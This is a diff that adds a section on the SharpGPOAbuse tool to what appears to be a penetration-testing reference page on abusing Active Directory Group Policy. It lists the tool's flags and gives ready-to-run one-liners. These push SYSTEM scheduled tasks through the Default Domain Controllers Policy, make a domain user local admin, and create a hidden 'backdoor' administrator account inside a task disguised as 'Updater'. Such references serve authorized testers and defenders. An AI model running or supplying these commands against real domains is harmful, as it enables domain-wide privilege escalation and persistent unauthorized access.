@@ -146,6 +146,76 @@ python3 pygpoabuse.py $DOMAIN/$USER -hashes aad3b435b51404eeaad3b435b51404ee:$NT
 python3 pygpoabuse.py $DOMAIN/$USER:$PASSWORD -gpo-id $GPO_ID -dc-ip $DC_IP --cleanup
 ```
 
+## SharpGPOAbuse
+
+.NET tool by FSecureLABS for abusing GPO write permissions from a Windows host (requires SYSVOL write access, unlike pyGPOAbuse). Must be run as the user with GPO edit rights, or under `runas /netonly`.
+
+```powershell wrap
+SharpGPOAbuse.exe --<AttackType> [options]
+```
+
+<AccordionGroup>
+  <Accordion title="Attack Types">
+    One is required.
+
+    | Flag | Description |
+    |------|-------------|
+    | `--AddComputerTask` | Add an immediate scheduled task that runs as SYSTEM on every computer in scope |
+    | `--AddUserTask` | Add an immediate scheduled task that runs as the logged-on user |
+    | `--AddComputerScript` | Add a computer startup/shutdown script |
+    | `--AddUserScript` | Add a user logon/logoff script |
+    | `--AddLocalAdmin` | Add a domain user/group to the local Administrators group via Restricted Groups |
+  </Accordion>
+  <Accordion title="GPO Selection">
+    One is required.
+
+    | Flag | Description |
+    |------|-------------|
+    | `--GPOName <name>` | Target GPO by display name |
+    | `--GPOId <GUID>` | Target GPO by GUID |
+  </Accordion>
+  <Accordion title="Task / Script Options">
+    | Flag | Description |
+    |------|-------------|
+    | `--TaskName <name>` | Name of the immediate scheduled task |
+    | `--Author <DOMAIN\user>` | Task author (defaults to `NT AUTHORITY\SYSTEM`) |
+    | `--Command <cmd>` | Command to execute, e.g. `cmd.exe` |
+    | `--Arguments <args>` | Arguments passed to `--Command` |
+    | `--UserAccount <user/group>` | Domain user or group to add as local admin (with `--AddLocalAdmin`) |
+    | `--Force` | Force an immediate GPO version bump / policy refresh |
+  </Accordion>
+  <Accordion title="Connection">
+    | Flag | Description |
+    |------|-------------|
+    | `--Domain <domain>` | Domain for the LDAP connection |
+    | `--DomainController <FQDN/IP>` | Domain controller to connect to |
+  </Accordion>
+</AccordionGroup>
+
+### One-Liners
+
+```powershell wrap
+# Add a domain user as local admin via Restricted Groups
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName "Default Domain Controllers Policy"
+
+# Immediate computer task running as SYSTEM — add a backdoor local admin
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author NT AUTHORITY\SYSTEM `
+  --Command cmd.exe --Arguments "/c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" `
+  --GPOName "Default Domain Controllers Policy"
+
+# Target by GPO GUID instead of name
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Command cmd.exe `
+  --Arguments "/c whoami > C:\Windows\Temp\out.txt" `
+  --GPOId 31B2F340-016D-11D2-945F-00C04FB984F9
+
+# Force immediate policy refresh after pushing the change
+gpupdate /force
+```
+
+<Note>
+After running SharpGPOAbuse, the change still waits for the next Group Policy refresh interval unless you force it — see [Post-Abuse](#post-abuse) below.
+</Note>
+
 ## ACL Prerequisite Chain
 
 GPO abuse usually sits at the end of an ACL chain. A common path is WriteDacl or WriteOwner on a user that already has GPO write access.
